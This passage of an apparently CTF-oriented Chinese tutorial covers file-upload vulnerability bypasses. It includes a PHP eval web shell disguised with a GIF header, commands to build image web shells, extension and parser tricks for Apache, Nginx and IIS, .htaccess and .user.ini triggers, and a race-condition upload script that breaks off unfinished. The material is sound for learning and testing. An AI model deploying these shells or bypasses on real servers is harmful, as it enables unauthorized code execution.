960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon copy-icon"><path d="M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z"></path></svg><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon success-icon"><path d="m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z"></path></svg></div></button></figure></div></section><section><h3 id="2-绕过浅层文件头校验">2. 绕过浅层文件头校验<a class="anchor" href="#2-绕过浅层文件头校验"><span class="anchor-icon" data-pagefind-ignore="">#</span></a></h3><p>只校验文件头时，在文件开头拼上图片标识：</p><div class="expressive-code"><figure class="frame" data-language="php"><figcaption class="header"></figcaption><pre data-language="php" class="wrap" style="--ecMaxLine:28ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#005CC5;--1:#79B8FF">GIF89a</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">&#x3C;?</span><span style="--0:#005CC5;--1:#79B8FF">php</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">@</span><span style="--0:#005CC5;--1:#79B8FF">eval</span><span style="--0:#24292E;--1:#E1E4E8">($_POST[</span><span style="--0:#032F62;--1:#9ECBFF">'x'</span><span style="--0:#24292E;--1:#E1E4E8">]); </span><span style="--0:#BF3441;--1:#F97583">?></span></div></div></code></pre><button class="copy-btn" aria-label="Copy code"><div class="copy-btn-icon"><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon copy-icon"><path d="M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z"></path></svg><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon success-icon"><path d="m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z"></path></svg></div></button></figure></div><p>常见文件签名：</p><div class="table-wrapper">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>格式</th><th>文件头</th></tr></thead><tbody><tr><td>GIF</td><td>47 49 46 38 39 61（GIF89A）或 47 49 46 38 37 61（GIF87A）</td></tr><tr><td>PNG</td><td>89504E47</td></tr><tr><td>JPG</td><td>FF D8 FF</td></tr></tbody></table></div><p>有文件头不代表真能当图片解码。图片马也不会自己执行，还要搭配文件包含、用户配置或错误等配置</p></section><section><h3 id="3-多扩展名与名称解析差异">3. 多扩展名与名称解析差异<a class="anchor" href="#3-多扩展名与名称解析差异"><span class="anchor-icon" data-pagefind-ignore="">#</span></a></h3><p>Apache 不是只看最后一个后缀，而是会分别处理每个后缀</p><p>例如：</p><div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext" class="wrap" style="--ecMaxLine:39ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">AddHandler application/x-httpd-php .php</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">AddType image/jpeg .jpg</span></div></div></code></pre><button class="copy-btn" aria-label="Copy code"><div class="copy-btn-icon"><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon copy-icon"><path d="M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z"></path></svg><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon success-icon"><path d="m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z"></path></svg></div></button></figure></div><p>对于：</p><div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext" class="wrap" style="--ecMaxLine:13ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">shell.php.jpg</span></div></div></code></pre><button class="copy-btn" aria-label="Copy code"><div class="copy-btn-icon"><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon copy-icon"><path d="M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z"></path></svg><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon success-icon"><path d="m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z"></path></svg></div></button></figure></div><p>Apache 可能得到：</p><div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext" class="wrap" style="--ecMaxLine:32ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">.php → 使用 PHP 处理</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">.jpg → Content-Type 是 image/jpeg</span></div></div></code></pre><button class="copy-btn" aria-label="Copy code"><div class="copy-btn-icon"><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon copy-icon"><path d="M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z"></path></svg><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon success-icon"><path d="m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z"></path></svg></div></button></figure></div><p>两项可以同时存在，所以文件仍可能被 PHP 执行。</p></section><section><h3 id="4-00-截断白名单场景">4. %00 截断（白名单场景）<a class="anchor" href="#4-00-截断白名单场景"><span class="anchor-icon" data-pagefind-ignore="">#</span></a></h3><div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext" class="wrap" style="--ecMaxLine:34ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">shell.php%00.jpg  →  截断为 shell.php</span></div></div></code></pre><button class="copy-btn" aria-label="Copy code"><div class="copy-btn-icon"><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon copy-icon"><path d="M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z"></path></svg><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon success-icon"><path d="m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z"></path></svg></div></button></figure></div><hr></section></section>
+<section><h2 id="六解析漏洞">六、解析漏洞<a class="anchor" href="#六解析漏洞"><span class="anchor-icon" data-pagefind-ignore="">#</span></a></h2><section><h3 id="1-apache-多后缀解析">1. Apache 多后缀解析<a class="anchor" href="#1-apache-多后缀解析"><span class="anchor-icon" data-pagefind-ignore="">#</span></a></h3><p><code>shell.php.jpg</code></p><p>Apache 会处理文件的多个后缀。在某些配置下，<code>.php</code> 仍会让文件交给 PHP 执行；现代 PHP-FPM 配置通常不会。具体流程见上</p></section><section><h3 id="2-nginx-路径解析">2. Nginx 路径解析<a class="anchor" href="#2-nginx-路径解析"><span class="anchor-icon" data-pagefind-ignore="">#</span></a></h3><div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext" class="wrap" style="--ecMaxLine:23ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">/upload/shell.jpg/1.php</span></div></div></code></pre><button class="copy-btn" aria-label="Copy code"><div class="copy-btn-icon"><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon copy-icon"><path d="M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z"></path></svg><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon success-icon"><path d="m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z"></path></svg></div></button></figure></div><p>如果 Nginx 和 PHP-FPM 配置不严，PHP 可能向前找到真实存在的 <code>shell.jpg</code>，并把它当作 PHP 文件执行。配置了 <code>try_files</code> 等限制后通常无法利用。</p></section><section><h3 id="3-iis-60-解析">3. IIS 6.0 解析<a class="anchor" href="#3-iis-60-解析"><span class="anchor-icon" data-pagefind-ignore="">#</span></a></h3><div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext" class="wrap" style="--ecMaxLine:14ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">shell.asp;.jpg</span></div></div></code></pre><button class="copy-btn" aria-label="Copy code"><div class="copy-btn-icon"><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon copy-icon"><path d="M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z"></path></svg><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon success-icon"><path d="m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z"></path></svg></div></button></figure></div><p>IIS 6.0 可能忽略分号后面的内容，把文件当成 <code>shell.asp</code> 解析。</p><p>目录名也可能触发：</p><div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext" class="wrap" style="--ecMaxLine:17ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">shell.asp/xxx.jpg</span></div></div></code></pre><button class="copy-btn" aria-label="Copy code"><div class="copy-btn-icon"><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon copy-icon"><path d="M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z"></path></svg><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon success-icon"><path d="m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z"></path></svg></div></button></figure></div><p>如果目录名以 <code>.asp</code> 结尾，目录里的文件可能被当作 ASP 解析。</p><hr></section></section>
+<section><h2 id="七内容校验绕过图片马与二次渲染">七、内容校验绕过（图片马与二次渲染）<a class="anchor" href="#七内容校验绕过图片马与二次渲染"><span class="anchor-icon" data-pagefind-ignore="">#</span></a></h2><section><h3 id="1-图片马构造">1. 图片马构造<a class="anchor" href="#1-图片马构造"><span class="anchor-icon" data-pagefind-ignore="">#</span></a></h3><p><strong>直接拼接</strong>（基础版）：</p><div class="expressive-code"><figure class="frame" data-language="bash"><figcaption class="header"></figcaption><pre data-language="bash" class="wrap" style="--ecMaxLine:52ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#616972;--1:#99A0A6"># Linux</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#005CC5;--1:#79B8FF">echo</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">'GIF89a&#x3C;?php @eval($_POST["x"]);?>'</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">></span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">shell.gif</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span style="--0:#616972;--1:#99A0A6"># 或把 PHP 代码追加到正常图片尾部</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span style="--0:#6F42C1;--1:#B392F0">cat</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">shell.php</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">>></span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">a.jpg</span></div></div></code></pre><button class="copy-btn" aria-label="Copy code"><div class="copy-btn-icon"><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon copy-icon"><path d="M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z"></path></svg><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon success-icon"><path d="m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z"></path></svg></div></button></figure></div><p><strong>结构合法版</strong>：把代码塞进图片注释、EXIF 或附加数据块，通常能过 <code>getimagesize</code> 这类检查。不过服务端如果用 GD/Imagick 重新编码，元数据多半会被清掉。</p></section><section><h3 id="2-二次渲染绕过">2. 二次渲染绕过<a class="anchor" href="#2-二次渲染绕过"><span class="anchor-icon" data-pagefind-ignore="">#</span></a></h3><p>服务端用 GD 库（<code>imagecreatefromgif</code> 等）重新生成图片 → 直接拼接的代码会被抹掉。</p><p><strong>做法</strong>：准备一张原图，让题目处理一次，再对比处理前后的字节。先找稳定不变的区域，再尝试插入。GIF、PNG、库版本和编码参数都会影响结果，没有一个位置能通吃所有题。</p><div class="expressive-code"><figure class="frame" data-language="python"><figcaption class="header"></figcaption><pre data-language="python" class="wrap" style="--ecMaxLine:35ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#616972;--1:#99A0A6"># 思路示例：用脚本逐字节 diff 原图与渲染后图片，定位未变化区间</span></div></div></code></pre><button class="copy-btn" aria-label="Copy code"><div class="copy-btn-icon"><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon copy-icon"><path d="M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z"></path></svg><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon success-icon"><path d="m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z"></path></svg></div></button></figure></div></section><section><h3 id="3-触发">3. 触发<a class="anchor" href="#3-触发"><span class="anchor-icon" data-pagefind-ignore="">#</span></a></h3><p>图片马无法被直接执行，必须配合：</p><ul>
+<li>文件包含：<code>?page=upload/shell.jpg</code></li>
+<li><code>.htaccess</code>：<code>AddType application/x-httpd-php .jpg</code></li>
+<li><code>.user.ini</code>：<code>auto_prepend_file=shell.jpg</code></li>
+<li>解析漏洞：Nginx <code>/shell.jpg/1.php</code></li>
+</ul><hr></section></section>
+<section><h2 id="八逻辑漏洞">八、逻辑漏洞<a class="anchor" href="#八逻辑漏洞"><span class="anchor-icon" data-pagefind-ignore="">#</span></a></h2><section><h3 id="1-条件竞争race-condition">1. 条件竞争（Race Condition）<a class="anchor" href="#1-条件竞争race-condition"><span class="anchor-icon" data-pagefind-ignore="">#</span></a></h3><p>场景：服务端”先保存到磁盘 → 校验不通过 → 删除”。删除有窗口期，抢在删除前访问即可执行。</p><p>利用时让“上传”和“访问临时文件”一起跑，抢在删除前读到固定回显：</p><div class="expressive-code"><figure class="frame" data-language="python"><figcaption class="header"></figcaption><pre data-language="python" class="wrap" style="--ecMaxLine:74ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">from</span><span style="--0:#24292E;--1:#E1E4E8"> concurrent.futures </span><span style="--0:#BF3441;--1:#F97583">import</span><span style="--0:#24292E;--1:#E1E4E8"> ThreadPoolExecutor, as_completed</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">import</span><span style="--0:#24292E;--1:#E1E4E8"> requests</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code">
+</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">upload_url </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">"http://target/upload"</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">probe_url </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">"http://target/upload/race.php"</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">payload </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">'&#x3C;?php echo "race-ok"; ?>'</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code">
+</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">def</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">upload_once</span><span style="--0:#24292E;--1:#E1E4E8">():</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">return</span><span style="--0:#24292E;--1:#E1E4E8"> requests.post(</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">        </span></span><span style="--0:#24292E;--1:#E1E4E8">upload_url,</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code"><span class="indent">        </span><span style="--0:#AE4B07;--1:#FFAB70">files</span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8">{</span><span style="--0:#032F62;--1:#9ECBFF">"file"</span><span style="--0:#24292E;--1:#E1E4E8">: (</span><span style="--0:#032F62;--1:#9ECBFF">"race.php"</span><span style="--0:#24292E;--1:#E1E4E8">, payload, </span><span style="--0:#032F62;--1:#9ECBFF">"application/octet-stream"</span><span style="--0:#24292E;--1:#E1E4E8">)},</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">12</div></div><div class="code"><span class="indent">        </span><span style="--0:#AE4B07;--1:#FFAB70">timeout</span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#005CC5;--1:#79B8FF">3</span><span style="--0:#24292E;--1:#E1E4E8">,</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">13</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">14</div></div><div class="code">
